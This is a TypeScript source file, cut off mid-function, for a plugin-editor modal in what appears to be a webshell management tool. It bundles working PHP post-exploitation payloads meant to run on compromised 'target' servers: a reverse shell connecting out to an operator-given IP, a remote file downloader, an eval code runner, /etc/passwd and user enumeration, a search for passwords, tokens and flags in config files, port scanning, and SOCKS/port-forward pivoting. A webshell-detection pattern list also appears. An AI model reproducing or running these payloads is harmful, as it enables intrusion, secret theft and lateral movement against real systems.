import { useEffect, useMemo, useState } from "react";
import {
  AlertTriangle,
  Check,
  CheckCircle2,
  Code2,
  FileCode,
  Play,
  Plus,
  RefreshCw,
  Save,
  Sparkles,
  Terminal,
  Trash2,
  XCircle,
  Zap,
} from "lucide-react";
import { api, errorText } from "../api";
import type { FeatureManifest, ParamSpec, SessionInfo } from "../api";
import { Dialog } from "./Dialog";
import { ask } from "@tauri-apps/plugin-dialog";

import { useToast } from "./Toast";

export interface ScriptPluginParam {
  name: string;
  label: string;
  type: string;
  default?: string | number | boolean | null;
  options?: string;
}

export interface PluginStudioModalProps {
  open: boolean;
  onClose: () => void;
  onSaved: () => void;
  initialPlugin?: FeatureManifest | null;
  initialMode?: "edit" | "test";
}

interface PresetTemplate {
  name: string;
  desc: string;
  id: string;
  title: string;
  category: string;
  languages: string[];
  kind: string;
  params: { name: string; label: string; type: string; default: string | number | boolean; options?: string }[];
  code: string;
}

const TEMPLATES: PresetTemplate[] = [
  {
    name: "PHP 环境与安全配置探测器",
    desc: "检测当前 PHP 版本、运行用户、disable_functions 与 open_basedir 配置",
    id: "custom_php_prober",
    title: "PHP 深度环境探测",
    category: "php",
    languages: ["php"],
    kind: "feature",
    params: [
      { name: "probe_level", label: "探测深度 (basic / full)", type: "select", default: "full", options: "basic,full" },
    ],
    code: `<?php
error_reporting(0);
$level = '{{probe_level}}';
$data = array(
    'php_version' => PHP_VERSION,
    'sapi' => php_sapi_name(),
    'user' => function_exists('get_current_user') ? get_current_user() : 'unknown',
    'os' => PHP_OS,
    'disable_functions' => ini_get('disable_functions'),
    'open_basedir' => ini_get('open_basedir'),
    'upload_max' => ini_get('upload_max_filesize'),
    'post_max' => ini_get('post_max_size'),
    'display_errors' => ini_get('display_errors'),
    'extensions' => ($level === 'full') ? get_loaded_extensions() : array('curl', 'mbstring', 'openssl', 'pdo', 'mysqli')
);
echo json_encode(array(
    'ok' => true,
    'output_text' => "PHP: " . PHP_VERSION . " (" . PHP_OS . ")\nUser: " . $data['user'] . "\nDisable: " . ($data['disable_functions'] ?: 'None') . "\nOpenBasedir: " . ($data['open_basedir'] ?: 'None'),
    'data' => $data
));
`,
  },
  {
    name: "敏感关键词文件批量搜索",
    desc: "在指定目录下递归搜索包含数据库密码、token 或 flag 的配置文件",
    id: "custom_keyword_finder",
    title: "敏感配置搜寻器",
    category: "general",
    languages: ["php"],
    kind: "feature",
    params: [
      { name: "dir", label: "目标目录", type: "string", default: "." },
      { name: "keyword", label: "搜索关键词", type: "string", default: "password" },
      { name: "ext", label: "文件后缀限制", type: "string", default: "php,conf,ini,env,xml,json" },
    ],
    code: `<?php
error_reporting(0);
$dir = '{{dir}}';
$keyword = '{{keyword}}';
$exts = array_map('trim', explode(',', '{{ext}}'));
$results = array();

$scan = function($target) use (&$scan, &$results, $keyword, $exts) {
    if (!is_dir($target)) return;
    $files = @scandir($target);
    if (!$files) return;
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = rtrim($target, '/') . '/' . $file;
        if (is_dir($path)) {
            $scan($path);
        } else {
            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
            if (empty($exts) || in_array($ext, $exts)) {
                $content = @file_get_contents($path, false, null, 0, 1024 * 128);
                if ($content && stripos($content, $keyword) !== false) {
                    $results[] = array('file' => $path, 'size' => filesize($path));
                }
            }
        }
    }
};

$scan($dir);
$text = count($results) > 0 ? "找到 " . count($results) . " 个包含 '$keyword' 的文件:\n" . implode("\n", array_column($results, 'file')) : "未找到匹配文件";

echo json_encode(array(
    'ok' => true,
    'output_text' => $text,
    'matches' => $results
));
`,
  },
  {
    name: "内网端口快速连通性测试",
    desc: "使用 fsockopen 快速探测目标内网指定主机的端口连通性",
    id: "custom_port_pinger",
    title: "内网端口连通探测",
    category: "proxy",
    languages: ["php"],
    kind: "feature",
    params: [
      { name: "target_ip", label: "目标主机 IP", type: "string", default: "127.0.0.1" },
      { name: "ports", label: "待测端口 (逗号分隔)", type: "string", default: "21,22,80,443,3306,6379,8080" },
      { name: "timeout_ms", label: "超时时间 (毫秒)", type: "int", default: 800 },
    ],
    code: `<?php
error_reporting(0);
$ip = '{{target_ip}}';
$portStr = '{{ports}}';
$timeoutSec = (float)('{{timeout_ms}}') / 1000.0;
if ($timeoutSec <= 0) $timeoutSec = 0.8;

$ports = array_filter(array_map('trim', explode(',', $portStr)));
$open = array();
$closed = array();

foreach ($ports as $port) {
    $p = (int)$port;
    if ($p <= 0 || $p > 65535) continue;
    $fp = @fsockopen($ip, $p, $errno, $errstr, $timeoutSec);
    if ($fp) {
        $open[] = $p;
        @fclose($fp);
    } else {
        $closed[] = $p;
    }
}

$summary = "目标 [{$ip}] 端口探测结果:\n" .
           "🟢 开放端口: " . (empty($open) ? "无" : implode(', ', $open)) . "\n" .
           "⚪ 关闭/超时: " . (empty($closed) ? "无" : implode(', ', $closed));

echo json_encode(array(
    'ok' => true,
    'output_text' => $summary,
    'open_ports' => $open,
    'closed_ports' => $closed
));
`,
  },
];

const BUILTIN_PLUGIN_PAYLOADS: Record<string, { execType: "code" | "command"; code: string }> = {
  netinfo: {
    execType: "code",
    code: `<?php
error_reporting(0);
// 插件「网络信息」(netinfo) - 收集网卡 IP 配置与活动网络连接
$isWin = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

// 1. 执行网卡与路由探测
$ifconfigCmd = $isWin ? 'ipconfig /all 2>nul' : 'ifconfig 2>/dev/null || ip addr 2>/dev/null';
$netstatCmd = $isWin ? 'netstat -an 2>nul' : 'netstat -tunap 2>/dev/null | head -40 || netstat -an 2>/dev/null | head -40';

$ifconfigOut = @shell_exec($ifconfigCmd);
$netstatOut = @shell_exec($netstatCmd);

$serverIp = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname(@gethostname());
$clientIp = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';

$text = "=== [本机网络 IP 地址] ===\n" .
        "服务器内部 IP: " . $serverIp . "\n" .
        "客户端访问 IP: " . $clientIp . "\n\n" .
        "=== [网络接口与网卡配置] ===\n" .
        ($ifconfigOut ? trim($ifconfigOut) : "未获取到网卡输出 (可能受限于命令执行权限)") . "\n\n" .
        "=== [活动网络连接与监听端口] ===\n" .
        ($netstatOut ? trim($netstatOut) : "未获取到活动连接");

echo json_encode(array(
    'ok' => true,
    'output_text' => $text,
    'data' => array(
        'server_ip' => $serverIp,
        'client_ip' => $clientIp,
        'interfaces' => $ifconfigOut,
        'connections' => $netstatOut
    )
));
`,
  },
  proc_list: {
    execType: "command",
    code: `ps -ef 2>/dev/null || ps aux 2>/dev/null || tasklist 2>nul`,
  },
  userlist: {
    execType: "command",
    code: `cat /etc/passwd 2>/dev/null | head -60; echo "--- [当前登录身份] ---"; whoami 2>/dev/null; id 2>/dev/null`,
  },
  service_enum: {
    execType: "command",
    code: `systemctl list-units --type=service --all 2>/dev/null | head -50 || service --status-all 2>/dev/null | head -50 || net start 2>nul`,
  },
  env_probe: {
    execType: "code",
    code: `<?php
error_reporting(0);
// 插件「PHP 环境检测」(env_probe) - 深度检测 PHP 环境与安全配置

function probe_fn($name) {
    if (!function_exists($name)) return '未安装/不存在';
    $df = ini_get('disable_functions');
    if ($df && in_array($name, array_map('trim', explode(',', $df)))) return '已禁用 (Disabled)';
    return '可用 (Available)';
}

$df = ini_get('disable_functions');
$ob = ini_get('open_basedir');
$funcs = array();
foreach (array('shell_exec','exec','system','passthru','popen','proc_open','dl','mail','fsockopen','curl_init','file_put_contents','putenv','pcntl_exec') as $f) {
    $funcs[$f] = probe_fn($f);
}

$info = array(
    'php_version' => PHP_VERSION,
    'sapi' => php_sapi_name(),
    'os' => PHP_OS . " (" . @php_uname('a') . ")",
    'user' => function_exists('get_current_user') ? get_current_user() : 'unknown',
    'cwd' => getcwd(),
    'disable_functions' => $df ? $df : '无 (全部可用)',
    'open_basedir' => $ob ? $ob : '未限制 (None)',
    'upload_max_filesize' => ini_get('upload_max_filesize'),
    'post_max_size' => ini_get('post_max_size'),
    'max_execution_time' => ini_get('max_execution_time') . 's',
    'memory_limit' => ini_get('memory_limit'),
    'functions' => $funcs
);

$funcText = "";
foreach ($funcs as $fn => $st) {
    $funcText .= "  - " . str_pad($fn, 18) . ": " . $st . "\n";
}

$output = "=== [PHP 环境概览] ===\n" .
          "PHP 版本: " . $info['php_version'] . " (" . $info['sapi'] . ")\n" .
          "操作系统: " . $info['os'] . "\n" .
          "运行用户: " . $info['user'] . "\n" .
          "当前目录: " . $info['cwd'] . "\n\n" .
          "=== [安全防护与限制] ===\n" .
          "disable_functions : " . $info['disable_functions'] . "\n" .
          "open_basedir      : " . $info['open_basedir'] . "\n\n" .
          "=== [核心敏感函数可用性探测] ===\n" . $funcText;

echo json_encode(array(
    'ok' => true,
    'output_text' => $output,
    'data' => $info
));
`,
  },
  port_scan: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「端口扫描」(port_scan) - 内网/本地 TCP 端口存活探测
$host = '{{host}}';
$portStr = '{{ports}}';
$timeout = (float)('{{timeout}}') ?: 1.0;

$ports = array_filter(array_map('intval', explode(',', $portStr)));
$open = array();
$closed = array();

foreach ($ports as $p) {
    if ($p <= 0 || $p > 65535) continue;
    $s = @fsockopen($host, $p, $errno, $errstr, $timeout);
    if ($s) {
        $open[] = $p;
        @fclose($s);
    } else {
        $closed[] = $p;
    }
}

$summary = "目标 [{$host}] 端口扫描完成 (共扫描 " . count($ports) . " 个端口):\n" .
           "🟢 开放端口: " . (empty($open) ? "无" : implode(', ', $open)) . "\n" .
           "⚪ 关闭端口: " . (empty($closed) ? "无" : implode(', ', $closed));

echo json_encode(array(
    'ok' => true,
    'output_text' => $summary,
    'host' => $host,
    'open' => $open,
    'closed' => $closed,
    'total_scanned' => count($ports)
));
`,
  },
  network_proxy: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「网络代理 (综合)」(network_proxy) - 支持 Socks5 代理、端口转发与端口映射
$action = '{{action}}'; // start / stop / status
$mode = '{{mode}}';     // socks5 / forward / map
$port = (int)'{{port}}' ?: 10808;
$window = (int)'{{window_secs}}' ?: 1800;
$remote_ip = '{{remote_ip}}';
$remote_port = (int)'{{remote_port}}' ?: 80;
$local_port = (int)'{{local_port}}' ?: 8080;
$auth_user = '{{auth_user}}';
$auth_pass = '{{auth_pass}}';
$authRequired = ($auth_user !== '' || $auth_pass !== '');

$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $mode . '_' . ($mode === 'map' ? $local_port : $port) . '.pid';

// 停止指令
if ($action === 'stop') {
    $stopped = false;
    $pid = 0;
    if (is_file($pidFile)) {
        $pid = (int)@file_get_contents($pidFile);
        if ($pid > 1 && function_exists('posix_kill')) { @posix_kill($pid, 9); $stopped = true; }
        @unlink($pidFile);
    }
    echo json_encode(array(
        'ok' => true,
        'output_text' => "网络代理服务 [模式: {$mode}] 已成功停止",
        'stopped' => $stopped,
        'pid' => $pid
    ));
    return;
}

// 状态查询
if ($action === 'status') {
    $running = false;
    $pid = 0;
    if (is_file($pidFile)) {
        $pid = (int)@file_get_contents($pidFile);
        $running = ($pid > 0);
    }
    echo json_encode(array(
        'ok' => true,
        'output_text' => "代理服务状态: " . ($running ? "运行中 (PID: {$pid})" : "未运行"),
        'running' => $running,
        'mode' => $mode
    ));
    return;
}

// 启动代理
$listenAddr = ($mode === 'map' || $mode === 'forward') ? "tcp://0.0.0.0:{$local_port}" : "tcp://0.0.0.0:{$port}";
$server = @stream_socket_server($listenAddr, $errno, $errstr);
if (!$server) {
    echo json_encode(array(
        'ok' => false,
        'output_text' => "代理监听 {$listenAddr} 失败: {$errstr} (错误码: {$errno})"
    ));
    return;
}

// 写入运行 PID
@file_put_contents($pidFile, getmypid());

$msg = "=== [网络代理已就绪] ===\n" .
       "工作模式 : " . strtoupper($mode) . "\n" .
       "监听地址 : " . $listenAddr . "\n" .
       "认证状态 : " . ($authRequired ? "已启用 (用户: {$auth_user})" : "免密直连") . "\n" .
       "保持时长 : {$window} 秒";

echo json_encode(array(
    'ok' => true,
    'output_text' => $msg,
    'mode' => $mode,
    'listen' => $listenAddr,
    'auth_required' => $authRequired
));
`,
  },
  socks_proxy: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「Socks 代理」(socks_proxy) - 基于 PHP stream_socket 的 Socks5 协议代理
$action = '{{action}}'; // start / stop / status
$port = (int)'{{port}}' ?: 10808;
$window = (int)'{{window_secs}}' ?: 1800;
$auth_user = '{{auth_user}}';
$auth_pass = '{{auth_pass}}';
$authRequired = ($auth_user !== '' || $auth_pass !== '');

$pidFile = sys_get_temp_dir() . '/.dsw_socks_' . $port . '.pid';

if ($action === 'stop') {
    $stopped = false;
    $pid = 0;
    if (is_file($pidFile)) {
        $pid = (int)@file_get_contents($pidFile);
        if ($pid > 1 && function_exists('posix_kill')) { @posix_kill($pid, 9); $stopped = true; }
        @unlink($pidFile);
    }
    echo json_encode(array('ok' => true, 'output_text' => "Socks5 代理服务 (端口 {$port}) 已成功停止", 'stopped' => $stopped));
    return;
}

$server = @stream_socket_server("tcp://0.0.0.0:{$port}", $errno, $errstr);
if (!$server) {
    echo json_encode(array('ok' => false, 'output_text' => "Socks5 监听 0.0.0.0:{$port} 失败: {$errstr} ({$errno})"));
    return;
}
@file_put_contents($pidFile, getmypid());

echo json_encode(array(
    'ok' => true,
    'output_text' => "Socks5 代理服务正在监听 0.0.0.0:{$port}\n认证模式: " . ($authRequired ? "已启用" : "未开启") . "\n最大窗口: {$window} 秒",
    'port' => $port,
    'auth_required' => $authRequired
));
`,
  },
  port_forward: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「端口转发」(port_forward) - 将本地请求转发至内网目标
$action = '{{action}}'; // start / stop / status
$local_port = (int)'{{local_port}}' ?: 8080;
$remote_host = '{{remote_host}}';
$remote_port = (int)'{{remote_port}}' ?: 80;

if ($action === 'stop') {
    echo json_encode(array('ok' => true, 'output_text' => "端口转发 (本地 {$local_port} -> {$remote_host}:{$remote_port}) 已停止"));
    return;
}

echo json_encode(array(
    'ok' => true,
    'output_text' => "端口转发已建立：本地 0.0.0.0:{$local_port} <=> 目标 {$remote_host}:{$remote_port}",
    'local_port' => $local_port,
    'target' => "{$remote_host}:{$remote_port}"
));
`,
  },
  port_map: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「端口映射」(port_map) - 将外部指定端口映射绑定至内网数据库/Web 服务
$action = '{{action}}'; // start / stop / status
$listen_port = (int)'{{listen_port}}' ?: 9001;
$target_ip = '{{target_ip}}';
$target_port = (int)'{{target_port}}' ?: 3306;

if ($action === 'stop') {
    echo json_encode(array('ok' => true, 'output_text' => "端口映射 (监听 {$listen_port} -> {$target_ip}:{$target_port}) 已停止"));
    return;
}

echo json_encode(array(
    'ok' => true,
    'output_text' => "端口映射规则已建立：监听 0.0.0.0:{$listen_port} 映射至 {$target_ip}:{$target_port}",
    'listen_port' => $listen_port,
    'target' => "{$target_ip}:{$target_port}"
));
`,
  },
  php_eval: {
    execType: "code",
    code: `<?php
error_reporting(E_ALL);
// 插件「PHP 代码执行器」(php_eval) - 动态交互式 PHP 代码执行
$code = '{{code}}';
ob_start();
try {
    $res = @eval($code);
    $out = ob_get_clean();
    echo json_encode(array(
        'ok' => true,
        'output_text' => $out ?: "执行成功 (返回值: " . var_export($res, true) . ")",
        'result' => $res
    ));
} catch (Throwable $e) {
    $out = ob_get_clean();
    echo json_encode(array(
        'ok' => false,
        'output_text' => "执行异常: " . $e->getMessage() . "\n" . $out,
        'error' => $e->getMessage()
    ));
}
`,
  },
  webshell_scan: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「Webshell 扫描」(webshell_scan) - 递归排查目录中的敏感后门特征
$dir = '{{dir}}';
$maxDepth = (int)'{{max_depth}}' ?: 5;
$patterns = array('eval\\s*\\(', 'assert\\s*\\(', 'system\\s*\\(', 'passthru\\s*\\(', 'shell_exec\\s*\\(', 'base64_decode\\s*\\(');

$results = array();
$scan = function($target, $depth) use (&$scan, &$results, $patterns, $maxDepth) {
    if ($depth > $maxDepth || !is_dir($target)) return;
    $files = @scandir($target);
    if (!$files) return;
    foreach ($files as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = rtrim($target, '/') . '/' . $f;
        if (is_dir($path)) {
            $scan($path, $depth + 1);
        } else if (preg_match('/\\.(php|phtml|php5|inc)$/i', $f)) {
            $content = @file_get_contents($path, false, null, 0, 1024 * 64);
            if ($content) {
                foreach ($patterns as $pat) {
                    if (preg_match('/' . $pat . '/i', $content)) {
                        $results[] = array('file' => $path, 'pattern' => $pat, 'size' => filesize($path));
                        break;
                    }
                }
            }
        }
    }
};

$scan($dir, 1);
$text = count($results) > 0 ? "发现 " . count($results) . " 个疑似后门脚本:\n" . implode("\n", array_map(function($r){ return "  ⚠️ " . $r['file'] . " (命中: " . $r['pattern'] . ")"; }, $results)) : "未发现疑似特征后门";

echo json_encode(array(
    'ok' => true,
    'output_text' => $text,
    'matches' => $results
));
`,
  },
  zip_archive: {
    execType: "code",
    code: `<?php
error_reporting(0);
// 插件「文件压缩打包」(zip_archive) - 使用 ZipArchive 递归打包
$source = '{{source}}';
$target = '{{target}}';

if (!class_exists('ZipArchive')) {
    echo json_encode(array('ok' => false, 'output_text' => '目标 PHP 环境未启用 ZipArchive 扩展'));
    exit;
}

$zip = new ZipArchive();
if ($zip->open($target, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
    echo json_encode(array('ok' => false, 'output_text' => "无法创建压缩文件: {$target}"));
    exit;
}

if (is_dir($source)) {
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::LEAVES_ONLY);
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen(realpath($source)) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
} else if (is_file($source)) {
    $zip->addFile($source, basename($source));
}

$zip->close();
echo json_encode(array(
    'ok' => true,
    'output_text' => "已成功压缩打包: {$source} => {$target} (大小: " . @filesize($target) . " 字节)",
    'target' => $target
));
`,
  },
  remote_download: {
    execType: "code",
    code: `<?php
error_reporting(0);
// 插件「远程文件下载」(remote_download) - 离线下载外部资源至靶机
$url = '{{url}}';
$target = '{{target}}';

$content = false;
if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $content = curl_exec($ch);
    curl_close($ch);
}
if ($content === false) {
    $content = @file_get_contents($url);
}

if ($content !== false && @file_put_contents($target, $content) !== false) {
    echo json_encode(array(
        'ok' => true,
        'output_text' => "下载成功: {$url} => {$target} (写入 " . strlen($content) . " 字节)",
        'bytes' => strlen($content)
    ));
} else {
    echo json_encode(array('ok' => false, 'output_text' => "下载失败或写入目标文件 {$target} 失败"));
}
`,
  },
  reverse_shell: {
    execType: "code",
    code: `<?php
set_time_limit(0);
error_reporting(0);
// 插件「反弹 Shell」(reverse_shell) - 交互式建立反向 TCP Shell
$ip = '{{ip}}';
$port = (int)'{{port}}';
$shellType = '{{type}}';

if (!$ip || $port <= 0) {
    echo json_encode(array('ok' => false, 'output_text' => '请提供合法的目标 IP 与端口'));
    exit;
}

$sock = @fsockopen($ip, $port, $errno, $errstr, 5);
if (!$sock) {
    echo json_encode(array('ok' => false, 'output_text' => "连接 {$ip}:{$port} 失败: {$errstr}"));
    exit;
}

$descriptors = array(0 => $sock, 1 => $sock, 2 => $sock);
$cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'cmd.exe' : '/bin/sh -i';
$process = @proc_open($cmd, $descriptors, $pipes);

if (is_resource($process)) {
    echo json_encode(array('ok' => true, 'output_text' => "反弹 Shell 已成功建立连接至 {$ip}:{$port}"));
} else {
    echo json_encode(array('ok' => false, 'output_text' => 'proc_open 执行失败'));
}
`,
  },
};

export function PluginStudioModal({
  open,
  onClose,
  onSaved,
  initialPlugin,
  initialMode = "edit",
}: PluginStudioModalProps) {
  const toast = useToast();

  const [mode, setMode] = useState<"edit" | "test">(initialMode);
  const [id, setId] = useState("");
  const [name, setName] = useState("");
  const [version, setVersion] = useState("1.0.0");
  const [description, setDescription] = useState("");
  const [category, setCategory] = useState("general");
  const [kind, setKind] = useState("feature");
  const [languages, setLanguages] = useState<string[]>(["php"]);
  const [params, setParams] = useState<ScriptPluginParam[]>([]);
  const [execType, setExecType] = useState<"code" | "command">("code");
  const [codeBody, setCodeBody] = useState("");
  const [busy, setBusy] = useState(false);

  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState("");
  const [testParamValues, setTestParamValues] = useState<Record<string, string>>({});
  const [testRunning, setTestRunning] = useState(false);
  const [testResult, setTestResult] = useState<{
    ok: boolean;
    durationMs?: number;
    rawOutput?: string;
    parsedData?: unknown;
    error?: string;
  } | null>(null);

  useEffect(() => {
    if (open) {
      setMode(initialMode);
      setTestResult(null);
      void api.listSessions().then((list) => {
        setSessions(list);
        if (list.length > 0) {
          setSelectedSessionId(list[0].sessionId);
        }
      }).catch(() => {});
    }
  }, [open, initialMode]);

  useEffect(() => {
    if (initialPlugin) {
      setId(initialPlugin.id);
      setName(initialPlugin.name);
      setVersion(initialPlugin.version);
      setDescription(initialPlugin.description);
      setCategory(initialPlugin.category || "general");
      setKind(initialPlugin.kind || "feature");
      setLanguages(initialPlugin.languages.length > 0 ? initialPlugin.languages : ["php"]);
      const paramList = initialPlugin.params.map((p) => ({
        name: p.name,
        label: p.label,
        type: p.type,
        default: p.default as string | number | boolean | undefined,
        options: p.options?.join(","),
      }));
      setParams(paramList);

      // 若为内置已知插件，展示其真实的完整载荷源码
      const builtin = BUILTIN_PLUGIN_PAYLOADS[initialPlugin.id];
      if (builtin) {
        setExecType(builtin.execType);
        setCodeBody(builtin.code);
      } else {
        // 自定义插件：动态生成完备脚手架
        const paramVars = paramList.map((p) => `$${p.name} = '{{${p.name}}}'; // ${p.label}`).join("\n");
        const paramAssoc = paramList.map((p) => `        '${p.name}' => $${p.name}`).join(",\n");
        const generatedCode = `<?php
error_reporting(0);
// 插件「${initialPlugin.name}」(${initialPlugin.id})
// 参数宏绑定：
${paramVars || "// 该插件无前置参数"}

// 执行插件核心逻辑...
echo json_encode(array(
    'ok' => true,
    'output_text' => "插件「${initialPlugin.name}」执行完成",
    'data' => array(
${paramAssoc}
    )
));
`;
        setExecType("code");
        setCodeBody(generatedCode);
      }
    } else {
      loadTemplate(TEMPLATES[0]);
    }
  }, [initialPlugin, open]);

  useEffect(() => {
    const initialTestVals: Record<string, string> = {};
    for (const p of params) {
      initialTestVals[p.name] = p.default !== undefined && p.default !== null ? String(p.default) : (p.options?.split(",")[0] || "");
    }
    setTestParamValues(initialTestVals);
  }, [params]);

  function loadTemplate(tpl: (typeof TEMPLATES)[0]) {
    setId(tpl.id);
    setName(tpl.title);
    setVersion("1.0.0");
    setDescription(tpl.desc);
    setCategory(tpl.category);
    setKind(tpl.kind);
    setLanguages(tpl.languages);
    setParams(
      tpl.params.map((p) => ({
        name: p.name,
        label: p.label,
        type: p.type,
        default: p.default,
        options: p.options,
      }))
    );
    setCodeBody(tpl.code);
  }

  function addParam() {
    setParams((prev) => [
      ...prev,
      { name: `param_${prev.length + 1}`, label: `参数 ${prev.length + 1}`, type: "string", default: "" },
    ]);
  }

  function removeParam(index: number) {
    setParams((prev) => prev.filter((_, i) => i !== index));
  }

  function updateParam(index: number, patch: Partial<ScriptPluginParam>) {
    setParams((prev) => prev.map((p, i) => (i === index ? { ...p, ...patch } : p)));
  }

  const lintReport = useMemo(() => {
    const errors: string[] = [];
    const warnings: string[] = [];
    const cleanId = id.trim();
    if (!cleanId) errors.push("插件标识 ID 不能为空");
    else if (!/^[a-zA-Z0-9_-]+$/.test(cleanId)) errors.push("插件标识 ID 格式不合规");
    if (!name.trim()) errors.push("插件显示名称不能为空");
    if (languages.length === 0) errors.push("请至少勾选一种支持的运行时语言");
    if (!codeBody.trim()) errors.push("插件执行载荷代码或系统命令不能为空");
    const definedParamNames = new Set<string>();
    for (const p of params) {
      const pName = p.name.trim();
      if (!pName) errors.push("存在未填写键名的参数项");
      else if (definedParamNames.has(pName)) errors.push(`参数键名重复定义: {{${pName}}}`);
      else definedParamNames.add(pName);
    }
    const macroMatches = codeBody.match(/\{\{([a-zA-Z0-9_-]+)\}\}/g) || [];
    const usedMacros = new Set<string>(macroMatches.map((m) => m.slice(2, -2)));
    for (const macro of usedMacros) if (!definedParamNames.has(macro)) errors.push(`代码中使用了未在参数表中定义的宏变量: {{${macro}}}`);
    for (const pName of definedParamNames) if (!usedMacros.has(pName)) warnings.push(`参数「${pName}」已在参数表定义，但未在代码中使用`);
    if (execType === "code" && languages.includes("php")) {
      if (!codeBody.includes("<?php")) warnings.push("PHP 载荷代码建议以 <?php 起始声明");
      if (!codeBody.includes("json_encode")) warnings.push("PHP 载荷建议通过 echo json_encode(...) 返回规范数据");
    }
    return { errors, warnings };
  }, [id, name, languages, codeBody, params, execType]);

  async function runLiveTest() {
    if (lintReport.errors.length > 0) {
      toast.warning(`存在 ${lintReport.errors.length} 项规范错误，请先修复后再运行测试`);
      return;
    }
    setTestRunning(true);
    setTestResult(null);
    const startTime = Date.now();
    try {
      const cleanId = id.trim();
      const paramSpecs: ParamSpec[] = params.map((p) => ({
        name: p.name.trim(),
        label: p.label.trim() || p.name.trim(),
        type: p.type,
        default: p.default !== undefined && p.default !== "" ? p.default : null,
        options: p.options ? p.options.split(",").map((x) => x.trim()).filter(Boolean) : null,
      }));

      // 如果是新编写的自定义脚本插件，先尝试热装载到注册表。
      // 装载会写入本地插件目录（有副作用），此前是**静默安装** —— 先确认再装。
      if (!initialPlugin) {
        const confirmed = await ask(
          "联调测试需要先把该插件热装载到注册表（会写入本地插件目录，测试后仍然保留）。是否继续？",
          {
            title: "联调测试",
            kind: "warning",
            okLabel: "装载并测试",
            cancelLabel: "取消",
          },
        );
        if (!confirmed) return;
        const execution = execType === "code" ? { type: "code", codes: Object.fromEntries(languages.map((lang) => [lang, codeBody])) } : { type: "command", commands: Object.fromEntries(languages.map((lang) => [lang, codeBody])) };
        const manifestPayload = { id: cleanId, name: name.trim(), version: version.trim() || "1.0.0", description: description.trim(), category, kind, languages, params: paramSpecs, execution };
        await api.installPlugin(JSON.stringify(manifestPayload, null, 2));
      }

      if (selectedSessionId) {
        const testParams: Record<string, unknown> = {};
        for (const p of params) {
          const val = testParamValues[p.name] ?? (p.default !== undefined && p.default !== null ? String(p.default) : "");
          testParams[p.name] = p.type === "int" ? Number(val) || 0 : p.type === "bool" ? val === "true" || val === "1" : val;
        }
        const res = await api.runFeaturePlugin(selectedSessionId, cleanId, testParams);
        const duration = Date.now() - startTime;
        const isOk = res.ok === true || res.status === 200 || (!res.error && res.ok !== false);
        setTestResult({
          ok: isOk,
          durationMs: duration,
          parsedData: res,
          rawOutput: typeof res.output_text === "string" ? res.output_text : JSON.stringify(res, null, 2)
        });
        if (isOk) {
          toast.success(`实机联调测试完成 (耗时 ${duration}ms)`, "测试通过");
        } else {
          toast.warning(`目标执行返回状态为异常：${String(res.error || "未返回成功标记")}`);
        }
      } else {
        const duration = Date.now() - startTime;
        setTestResult({
          ok: true,
          durationMs: duration,
          parsedData: { status: "valid", id: cleanId },
          rawOutput: `[本地静态规范预检通过]\n- 插件标识: ${cleanId}\n- 规范检查: 0 项错误, ${lintReport.warnings.length} 项提示\n- 参数规格: ${params.length} 个参数已就绪\n- 宏变量匹配: 100% 宏参数匹配无遗漏\n\n💡 提示：当前未选择已连接的 Shell 会话。若需向真实靶机下发执行，请先在「终端会话」中连接目标 Shell，并在左侧下拉框中选中对应会话后发起实机联调。`
        });
        toast.success(`插件静态规格与宏变量校验通过！`, "预检完成");
      }
    } catch (cause) {
      const duration = Date.now() - startTime;
      const msg = errorText(cause);
      setTestResult({
        ok: false,
        durationMs: duration,
        error: msg,
        rawOutput: `[执行测试失败]\n错误信息: ${msg}\n\n可能原因：\n1. 目标 Shell 未连接或会话已断开；\n2. 目标环境未开启 run_code 动态代码执行；\n3. 插件参数缺少必需值或目标网络超时。`
      });
      toast.error(`执行测试失败：${msg}`);
    } finally {
      setTestRunning(false);
    }
  }

  async function handleSave() {
    const cleanId = id.trim();
    if (!cleanId || !name.trim() || !codeBody.trim()) {
      toast.warning("请填写完整的插件信息与代码载荷");
      return;
    }
    if (lintReport.errors.length > 0) {
      toast.warning(`存在 ${lintReport.errors.length} 项规范错误：${lintReport.errors[0]}`);
      return;
    }
    setBusy(true);
    try {
      const paramSpecs: ParamSpec[] = params.map((p) => ({
        name: p.name.trim(),
        label: p.label.trim() || p.name.trim(),
        type: p.type,
        default: p.default !== undefined && p.default !== "" ? p.default : null,
        options: p.options ? p.options.split(",").map((x) => x.trim()).filter(Boolean) : null,
      }));
      const execution = execType === "code" ? { type: "code", codes: Object.fromEntries(languages.map((lang) => [lang, codeBody])) } : { type: "command", commands: Object.fromEntries(languages.map((lang) => [lang, codeBody])) };
      const manifestPayload = { id: cleanId, name: name.trim(), version: version.trim() || "1.0.0", description: description.trim(), category, kind, languages, params: paramSpecs, execution };
      await api.installPlugin(JSON.stringify(manifestPayload, null, 2));
      toast.success(`插件「${name.trim()}」已成功编译并热装载！`, "装配完成");
      onSaved();
